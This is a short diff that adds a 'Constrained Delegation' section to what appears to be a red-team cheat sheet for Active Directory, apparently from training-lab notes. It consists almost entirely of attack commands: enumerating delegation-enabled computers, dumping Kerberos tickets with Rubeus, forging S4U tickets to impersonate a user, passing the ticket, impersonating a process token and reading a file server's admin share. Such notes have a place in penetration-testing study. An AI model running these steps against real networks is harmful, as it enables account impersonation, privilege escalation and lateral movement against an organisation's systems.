@@ -25,3 +25,16 @@ Rubeus dump /luid:0x1b37e
 Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
 Rubeus ptt /luid:0x21d8e17 /ticket:[...snip...]
 ```
+
+### Constrained Delegation
+```
+powershell Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo
+Rubeus dump /service:krbtgt
+Rubeus s4u /impersonateuser:n.glover /msdsspn:cifs/fs-1.cyberbotic.io /ticket:[...snip...]
+Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
+Rubeus ptt /luid:0x239b995 /ticket:[...snip...]
+ImpersonateProcess 3420
+ls \\fs-1.cyberbotic.io\c$
+```
+
+
